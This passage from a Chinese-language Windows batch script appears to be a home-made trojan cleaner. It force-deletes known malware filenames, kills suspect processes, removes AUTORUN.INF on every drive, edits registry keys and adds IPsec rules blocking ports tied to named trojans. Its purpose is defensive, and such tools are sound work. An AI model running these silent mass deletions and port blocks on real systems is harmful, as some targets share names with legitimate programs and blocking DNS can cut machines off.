del /A /S /F /Q %pf%\Sysedit32.exe
del /A /S /F /Q %pf%\Scvhost.exe
del /A /S /F /Q %pf%\Syshelp.exe
del /A /S /F /Q %pf%\Internet.exe
cls
echo 已进行百分之93
del /A /S /F /Q %pf%\Sysrunt.exe
del /A /S /F /Q %pf%\Kernel16.exe
del /A /S /F /Q %pf%\Kernel32.exe
del /A /S /F /Q %pf%\System32.exe
del /A /S /F /Q %pf%\Kiss.exe
del /A /S /F /Q %pf%\Krn132.exe
del /A /S /F /Q %pf%\Syswindow.exe
del /A /S /F /Q %pf%\Libupdate.exe
del /A /S /F /Q %pf%\Load.exe
del /A /S /F /Q %pf%\Task_Bar.exe
del /A /S /F /Q %pf%\Lockdown2000.exe
del /A /S /F /Q %pf%\Taskbar.exe
cls
echo 已进行百分之94
del /A /S /F /Q %pf%\Lockdown2000.exe
del /A /S /F /Q %pf%\Taskmon.exe
del /A /S /F /Q %pf%\Taskmon32.exe
del /A /S /F /Q %pf%\Tds2-98.exe
del /A /S /F /Q %pf%\Tds2-Nt.exe
del /A /S /F /Q %pf%\Temp_$01.exe
del /A /S /F /Q %pf%\Tempinetb00st.exe
del /A /S /F /Q %pf%\Tempserver.exe
del /A /S /F /Q %pf%\Vshwin32.exe
del /A /S /F /Q %pf%\Vsstart.exe
del /A /S /F /Q %pf%\Vw32.exe
del /A /S /F /Q %pf%\Windown.exe
del /A /S /F /Q %pf%\Windows.exe
del /A /S /F /Q %pf%\Winfunctions.exe
cls
echo 已进行百分之95
del /A /S /F /Q %pf%\Wingate.exe
del /A /S /F /Q %pf%\Wink????.exe
del /A /S /F /Q %pf%\Winl0g0n.exe
del /A /S /F /Q %pf%\Winmgm32.exe
del /A /S /F /Q %pf%\Winmsg32.exe
cls
echo 已进行百分之96
del /A /S /F /Q %pf%\Winprot.exe
del /A /S /F /Q %pf%\Winprotecte.exe
del /A /S /F /Q %pf%\Winrpcsrv.exe
del /A /S /F /Q %pf%\Winserv.exe
cls
echo 已进行百分之97
del /A /S /F /Q %pf%\Wubsys.exe
del /A /S /F /Q %pf%\Winupdate.exe
del /A /S /F /Q %pf%\Winvnc.exe
del /A /S /F /Q %pf%\Winzip.exe
del /A /S /F /Q %pf%\Wqk.exe
cls
echo 已进行百分之98
del /A /S /F /Q %pf%\Wscan.exe
del /A /S /F /Q %pf%\Zcn32.exe
del /A /S /F /Q %pf%\Xx.Tmp.exe
cls
echo 已进行百分之99
del /A /S /F /Q %pf%\Zonealarm.exe
del /A /S /F /Q %pf%\Wscan.exe
del /A /S /F /Q %pf%\Zcn32.exe
del /A /S /F /Q %pf%\Zonealarm.exe
cls
echo 已进行百分之100
echo %systemen%|findstr "^xp" >nul
if %errorlevel% equ 0 (
goto shadu0000001
) else (
goto shadu000002
)
:shadu0000001
cls
TASKKILL /F /T /IM SXS.EXE
TASKKILL /F /T /IM SVOHOST.EXE 
TASKKILL /F /T /IM ROSE.EXE
ECHO Windows Registry Editor Version 5.00>SHOWALL.reg
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL]>>SHOWALL.reg
ECHO "CheckedValue"=->>SHOWALL.reg
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL]>>SHOWALL.reg
ECHO "CheckedValue"=dword:00000001>>SHOWALL.reg
ATTRIB -R -H -S -A %SysDir%\SXS.EXE
ATTRIB -R -H -S -A %SysDir%\SVOHOST.EXE
ATTRIB -R -H -S -A %SysDir%\WINSCOK.DLL
DEL /F /Q /A -R -H -S -A %SysDir%\SXS.EXE
DEL /F /Q /A -R -H -S -A %SysDir%\SVOHOST.EXE
DEL /F /Q /A -R -H -S -A %SysDir%\WINSCOK.DLL
ATTRIB -R -H -S -A %WinDir%\SXS.EXE
ATTRIB -R -H -S -A %WinDir%\SVOHOST.EXE
ATTRIB -R -H -S -A %WinDir%\WINSCOK.DLL
DEL /F /Q /A -R -H -S -A %WinDir%\SXS.EXE
DEL /F /Q /A -R -H -S -A %WinDir%\SVOHOST.EXE
DEL /F /Q /A -R -H -S -A %WinDir%\WINSCOK.DLL
ATTRIB -R -H -S -A %WinDir%\System\SXS.EXE
ATTRIB -R -H -S -A %WinDir%\System\SVOHOST.EXE
ATTRIB -R -H -S -A %WinDir%\System\WINSCOK.DLL
DEL /F /Q /A -R -H -S -A %WinDir%\System\SXS.EXE
DEL /F /Q /A -R -H -S -A %WinDir%\System\SVOHOST.EXE
DEL /F /Q /A -R -H -S -A %WinDir%\System\WINSCOK.DLL
ATTRIB -R -H -S -A %SysDir%\dllcache\SXS.EXE
ATTRIB -R -H -S -A %SysDir%\dllcache\SVOHOST.EXE
ATTRIB -R -H -S -A %SysDir%\dllcache\WINSCOK.DLL
DEL /F /Q /A -R -H -S -A %SysDir%\dllcache\SXS.EXE
DEL /F /Q /A -R -H -S -A %SysDir%\dllcache\SVOHOST.EXE
DEL /F /Q /A -R -H -S -A %SysDir%\dllcache\WINSCOK.DLL
FOR %%a IN ( C: D: E: F: G: H: I: J: K: L: M: N: O: P: Q: R: S: T: U: V: W: X: Y: Z: ) DO ATTRIB -R -H -S -A %%a\SXS.EXE & DEL /F /Q /A -R -H -S -A %%a\SXS.EXE & ATTRIB -R -H -S -A %%a\AUTORUN.INF & DEL /F /Q /A -R -H -S -A %%a\AUTORUN.INF
ECHO Windows Registry Editor Version 5.00>SoundMam.reg
ECHO [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SoundMam]>>SoundMam.reg
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>SoundMam.reg
ECHO "SoundMam"=->>SoundMam.reg
REGEDIT /S SoundMam.reg
DEL /F /Q SoundMam.reg
REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg
ipseccmd  -w REG -p "HFUT_SECU" -o -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -x >nul
rem ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/80" -f *+0:80:TCP -n BLOCK -x >nul
rem ipseccmd  -w REG -p "HFUT_SECU" -r "Block UDP/1434" -f *+0:1434:UDP -n BLOCK -x >nul
rem ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/139" -f *+0:139:TCP -n BLOCK -x >nul 
rem echo 禁止NetBIOS/SMB服务和文件和打印机共享和SAMBA（去掉REM生效）
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/135" -f *+0:135:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block UDP/135" -f *+0:135:UDP -n BLOCK -x >nul
echo 禁止本地服务和防止 Dos 攻击…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/445" -f *+0:445:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block UDP/445" -f *+0:445:UDP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/1025" -f *+0:1025:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block UDP/139" -f *+0:139:UDP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/1068" -f *+0:1068:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/5554" -f *+0:5554:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/9995" -f *+0:9995:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/9996" -f *+0:9996:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block ICMP/255" -f *+0:255:ICMP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/43958" -f *+0:43958:TCP -n BLOCK -x >nul
echo 关闭流行危险端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
echo 关闭木马NetBus Pro开放的端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/1092" -f *+0:1092:TCP -n BLOCK -x >nul
echo 关闭蠕虫LoveGate开放的端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/3996" -f *+0:3996:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/4060" -f *+0:4060:TCP -n BLOCK -x >nul
echo 关闭木马RemoteAnything开放的端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
echo 关闭木马ICQTrojan开放的端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/1080" -f *+0:1080:TCP -n BLOCK -x >nul
echo 禁止代理服务器扫描…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/113" -f *+0:113:TCP -n BLOCK -x >nul
echo 禁止Authentication Service服务…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/79" -f *+0:79:TCP -n BLOCK -x >nul
echo 禁止Finger扫描…………OK！
ipseccmd  -w REG -p "HFUT_SECU" -r "Block UDP/53" -f *+0:53:UDP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/53" -f *+0:53:TCP -n BLOCK -x >nul
echo 禁止区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/707" -f *+0:707:TCP -n BLOCK -x >nul
echo 关闭nachi蠕虫病毒监听端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/808" -f *+0:808:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/23" -f *+0:23:TCP -n BLOCK -x >nul
echo 关闭Telnet 和木马Tiny Telnet Server监听端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/520" -f *+0:520:TCP -n BLOCK -x >nul
echo 关闭Rip 端口…………OK！
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
echo 关闭木马程序BackDoor的默认服务端口…………OK！
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
echo 关闭马程序黑洞2001的默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo 关闭木马程序Ripper的默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
echo 关闭木马程序Wincrash v2的默认服务端口…………OK！
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/3389" -f *+0:3389:TCP -n BLOCK -x >nul
echo 关闭Windows 的远程管理终端（远程桌面）监听端口…………OK！
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/4444" -f *+0:4444:TCP -n BLOCK -x >nul
echo 关闭msblast冲击波蠕虫监听端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/4899" -f *+0:4899:TCP -n BLOCK -x >nul
echo 关闭远程控制软件（remote administrator)服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/5800" -f *+0:5800:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/5900" -f *+0:5900:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/8888" -f *+0:8888:TCP -n BLOCK -x >nul
echo 关闭远程控制软件VNC的两个默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
echo 关闭Dameware服务端默认监听端口（可变！）…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/6267" -f *+0:6267:TCP -n BLOCK -x >nul
echo 关闭木马广外女生的默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/660" -f *+0:660:TCP -n BLOCK -x >nul
echo 关闭木马DeepThroat v1.0 - 3.1默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/6671" -f *+0:6671:TCP -n BLOCK -x >nul
echo 关闭木马Indoctrination默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/6939" -f *+0:6939:TCP -n BLOCK -x >nul
echo 关闭木马PRIORITY默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo 关闭木马网络精灵默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/7511" -f *+0:7511:TCP -n BLOCK -x >nul
echo 关闭木马聪明基因的默认连接端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/7626" -f *+0:7626:TCP -n BLOCK -x >nul
echo 关闭木马冰河默认端口(注意可变！)…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
echo 关闭木马WAY2.4默认服务端口…………OK！
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
echo 关闭木马InIkiller默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/19191" -f *+0:19191:TCP -n BLOCK -x >nul
echo 关闭木马兰色火焰默认开放的telnet端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/1029" -f *+0:1029:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/20168" -f *+0:20168:TCP -n BLOCK -x >nul
echo 关闭lovegate 蠕虫所开放的两个后门端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
echo 关闭木马网络公牛默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
echo 关闭木马SUB7默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
echo 关闭木马NetSphere默认的服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/31337" -f *+0:31337:TCP -n BLOCK -x >nul
echo 关闭木马BO2000默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/45576" -f *+0:45576:TCP -n BLOCK -x >nul
echo 关闭代理软件的控制端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
echo 关闭木马Schwindler默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
echo 关闭木马Telecommando默认服务端口…………OK!

ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/31338" -f *+0:31338:TCP -n BLOCK -x >nul
echo 关闭木马Back Orifice默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8102" -f *+0:8102:TCP -n BLOCK -x >nul
echo 关闭木马网络神偷默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2000" -f *+0:2000:TCP -n BLOCK -x >nul
echo 关闭木马黑洞2000默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31339" -f *+0:31339:TCP -n BLOCK -x >nul
echo 关闭木马NetSpy DK默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
echo 关闭木马黑洞2001默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31666" -f *+0:31666:TCP -n BLOCK -x >nul
echo 关闭木马BOWhack默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
echo 关闭木马BigGluck默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo 关闭木马网络精灵3.0，netspy3.0默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40412" -f *+0:40412:TCP -n BLOCK -x >nul
echo 关闭木马The Spy默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40421" -f *+0:40421:TCP -n BLOCK -x >nul
echo 关闭木马Masters Paradise默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
echo 关闭木马wry，赖小子，火凤凰默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40422" -f *+0:40422:TCP -n BLOCK -x >nul
echo 关闭木马Masters Paradise 1.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
echo 关闭木马网络公牛，netbull默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40423" -f *+0:40423:TCP -n BLOCK -x >nul
echo 关闭木马Masters Paradise 2.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23445" -f *+0:23445:TCP -n BLOCK -x >nul
echo 关闭木马网络公牛，netbull默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40426" -f *+0:40426:TCP -n BLOCK -x >nul
echo 关闭木马Masters Paradise 3.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50505" -f *+0:50505:TCP -n BLOCK -x >nul
echo 关闭木马Sockets de Troie默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
echo 关闭木马Sub Seven 2.0+，77，东方魔眼默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
echo 关闭木马Fore默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
echo 关闭木马Remote Windows Shutdown默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
echo 关闭木马Telecommando默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/121" -f *+0:121:TCP -n BLOCK -x >nul
echo 关闭木马BO jammerkillahV默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
echo 关闭木马Satanz Backdoor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
echo 关闭木马Devil默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo 关闭木马Silencer默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6400" -f *+0:6400:TCP -n BLOCK -x >nul
echo 关闭木马The tHing默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1600" -f *+0:1600:TCP -n BLOCK -x >nul
echo 关闭木马Shivka-Burka默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12346" -f *+0:12346:TCP -n BLOCK -x >nul
echo 关闭木马NetBus 1.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1807" -f *+0:1807:TCP -n BLOCK -x >nul
echo 关闭木马SpySender默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
echo 关闭木马NetBus Pro默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
echo 关闭木马Shockrave默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1243" -f *+0:1243:TCP -n BLOCK -x >nul
echo 关闭木马SubSeven默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo 关闭木马WebEx默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
echo 关闭木马NetSphere默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1011" -f *+0:1011:TCP -n BLOCK -x >nul
echo 关闭木马Doly Trojan默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo 关闭木马Silencer默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
echo 关闭木马Psyber Stream Server默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20000" -f *+0:20000:TCP -n BLOCK -x >nul
echo 关闭木马Millenium默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1234" -f *+0:1234:TCP -n BLOCK -x >nul
echo 关闭木马Ultors Trojan默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
echo 关闭木马Devil 1.03默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
echo 关闭木马VooDoo Doll默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1492" -f *+0:1492:TCP -n BLOCK -x >nul
echo 关闭木马FTP99CMP默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
echo 关闭木马Streaming Audio Trojan默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
echo 关闭木马BackDoor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30303" -f *+0:30303:TCP -n BLOCK -x >nul
echo 关闭木马Socket23默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
echo 关闭木马Trojan Cow默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
echo 关闭木马Gatecrasher默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo 关闭木马Ripper默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
echo 关闭木马Telecommando默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2115" -f *+0:2115:TCP -n BLOCK -x >nul
echo 关闭木马Bugs默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12076" -f *+0:12076:TCP -n BLOCK -x >nul
echo 关闭木马Gjamer默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
echo 关闭木马Deep Throat默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
echo 关闭木马IcqTrojen默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
echo 关闭木马The Invasor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/16969" -f *+0:16969:TCP -n BLOCK -x >nul
echo 关闭木马Priotrity默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2801" -f *+0:2801:TCP -n BLOCK -x >nul
echo 关闭木马Phineas Phucker默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
echo 关闭木马Vodoo默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30129" -f *+0:30129:TCP -n BLOCK -x >nul
echo 关闭木马Masters Paradise默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5742" -f *+0:5742:TCP -n BLOCK -x >nul
echo 关闭木马Wincrash默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3700" -f *+0:3700:TCP -n BLOCK -x >nul
echo 关闭木马Portal of Doom默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
echo 关闭木马Wincrash2默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4092" -f *+0:4092:TCP -n BLOCK -x >nul
echo 关闭木马WinCrash默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1033" -f *+0:1033:TCP -n BLOCK -x >nul
echo 关闭木马Netspy默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
echo 关闭木马ICQTrojan默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
echo 关闭木马ShockRave默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5000" -f *+0:5000:TCP -n BLOCK -x >nul
echo 关闭木马Sockets de Troie默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
echo 关闭木马Stealth Spy默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5001" -f *+0:5001:TCP -n BLOCK -x >nul
echo 关闭木马Sockets de Troie 1.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo 关闭木马Pass Ripper默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5321" -f *+0:5321:TCP -n BLOCK -x >nul
echo 关闭木马Firehotcker默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
echo 关闭木马Attack FTP默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
echo 关闭木马Blade Runner默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/21554" -f *+0:21554:TCP -n BLOCK -x >nul
echo 关闭木马GirlFriend默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5401" -f *+0:5401:TCP -n BLOCK -x >nul
echo 关闭木马Blade Runner 1.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
echo 关闭木马Fore Schwindler默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5402" -f *+0:5402:TCP -n BLOCK -x >nul
echo 关闭木马Blade Runner 2.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
echo 关闭木马Tiny Telnet Server默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
echo 关闭木马Robo-Hack默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30999" -f *+0:30999:TCP -n BLOCK -x >nul
echo 关闭木马Kuang默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6670" -f *+0:6670:TCP -n BLOCK -x >nul
echo 关闭木马DeepThroat默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11000" -f *+0:11000:TCP -n BLOCK -x >nul
echo 关闭木马Senna Spy Trojans默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6771" -f *+0:6771:TCP -n BLOCK -x >nul
echo 关闭木马DeepThroat默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23456" -f *+0:23456:TCP -n BLOCK -x >nul
echo 关闭木马WhackJob默认服务端口…………OK!
